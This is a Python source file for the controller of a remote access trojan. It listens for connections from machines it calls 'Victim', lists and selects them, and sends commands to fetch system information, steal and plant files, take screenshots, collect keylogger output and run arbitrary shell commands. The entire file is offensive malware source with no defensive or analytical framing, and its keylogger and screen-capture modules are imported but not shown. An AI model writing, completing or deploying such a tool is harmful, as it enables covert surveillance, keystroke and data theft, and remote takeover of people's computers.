import socket
import threading

from utils.fileTransfer import *
from utils.keyLogger import *
from utils.ScreenCapture import *

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


client_connections = []
client_address = []
def list_client_connections():
    output=""

    for i,conn in enumerate(client_connections):
        try:
            conn.send(str.encode(" "))
            conn.recv(20480)
        except:
            del client_connections[i]
            del client_address[i]
            continue

        output+=str(i) + "                   " + str(client_address[i][0]) + "                  " + str(client_address[i][1]) + "\n"  # adding information of active client to output

    print("-------ACTIVE CLIENTS--------" + "\n" + "CLIENT ID              IP-Address             PORT" + "\n" + output)    # printing the list of active clients


def get_target_client(inp):
    try:
        client_id=inp.split(" ")[1]
        client_id=int(client_id)
        conn=client_connections[client_id]
        print("You are now connected to " + str(client_address[client_id][0]))
        print(str(client_address[client_id][0]) + "> ",end="")
        return conn,client_address[client_id][0]+'-'+str(client_address[client_id][1])

    except:
        print("Selected client id not valid")
        return None


def send_command(conn, ip):
    try:
        os.mkdir(os.path.join(os.getcwd(), ip))
    except Exception as e:
        pass


    while True:
        try:
            print("--------Enter the commands for Victim---------")
            print("1.Get the Sytem Information of Victim - sysinfo")
            print("2.Get file from Victim - getfile")
            print("3.Send file to Victim - sendfile")
            print("4.Get Screenshot of the Victim - ss")
            print("5.Get Key logs of the client - keylogger")
            print("6.Change Directory of Victim - cd")
            print("You can also execute other shell commands for the Client")


            cmd = input("> ")

            if cmd == "quit":
                conn.close()
                s.close()
                break

            if len(str.encode(cmd)) > 0:
                conn.sendall(cmd.encode())

                client_response = conn.recv(20480).decode()

            if client_response == "Logging_keys":
                keyLogger(conn, ip)
                continue



            if client_response == "clicking":
                print("con ip ", conn, ip)
                screenshot(conn, ip)
                continue


            if client_response == "sending_file":
                getfile(conn, cmd, ip)
                continue


            if client_response == "receiving_file":
                sendfile(conn, cmd)
                continue


            print(client_response,end="")


        except Exception as e:
            print("Error", e)


def handle_client(client,addr):

    while True:
        try:
            print("--------Commands for Server---------")
            print("1.List Available Connections - list")
            print("2.Select a Particular Client Connection - select")
            print("3.Exit ")
            inp=input("> ")
            if inp=="list":
                list_client_connections()
            elif inp.split(' ')[0]=="select":
                client=get_target_client(inp)
                if client:
                    send_command(client[0],client[1])
            elif inp=="exit":
                for c in client_connections:
                    c.send(bytes('exit','utf-8'))
                    s.close()
                    break



        except:
            print("Error")
            client.close()
            break




def start():

    host=input("Enter your IP Address: ")
    port=int(input("Enter the port number to listen for incoming client connection: "))

    s.bind((host,port))
    s.listen(10)
    print("Server Waiting for Connection from Victim")
    while True:
        c, addr = s.accept()
        client_connections.append(c)
        client_address.append(addr)
        cthread = threading.Thread(target=handle_client, args=(c, addr))
        cthread.start()



start()